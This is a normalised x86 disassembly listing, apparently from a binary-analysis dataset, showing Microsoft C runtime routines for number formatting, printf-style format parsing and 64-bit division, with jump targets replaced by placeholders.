mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_44d5c0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_44d5c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_44d5c0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_448f22
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_438ce6
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
call sub_43f8c5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_43c860
inc eax
push eax
push esi
push ebx
call sub_437db0
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_43c860
inc eax
push eax
push esi
push ebx
call sub_437db0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_44891f
push edi
push 0x30
push ebx
call sub_43a820
add esp 0xc
sub_449025
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_44d523
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_43c04c
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_43c04c
mov [ eax ] esi
call sub_43f8c5
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_44d3bd
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_448f22
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_4490e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_44d523
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_43c04c
mov [ eax ] edi
call sub_43f8c5
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_44d3bd
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_448964
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_448f22
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_4491d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_448ac5
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_449025
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_448bac
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4490e6
jmp r-xdata
sub_44925b
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4491d3
add esp 0x1c
pop ebp
retn
sub_44927e
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_4492a1
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_44d6c8
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_43f873
sub_4492d0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_449380
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_449432
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_44d995
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44d9d7
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44952a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_43de17
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_4381f8
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_44db73
pop ecx
pop ecx
test eax eax
jns r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x4 ]
call sub_4381f8
pop ecx
mov [ ebp - 0x4 ] esi
sub_4495c1
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_4495de
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43917d
push eax
call sub_44cd54
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_438fc8
add eax 0x20
cmp esi eax
jne r-xdata
call sub_438fc8
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_43ddd2
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_44967a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_43bc19
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_4496ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_438ce6
call sub_43c04c
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_43917d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_44a2c2 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_44b5f1
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_4410f9
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_4410f9
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_4381f8
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_44112c
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_44cdaa
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
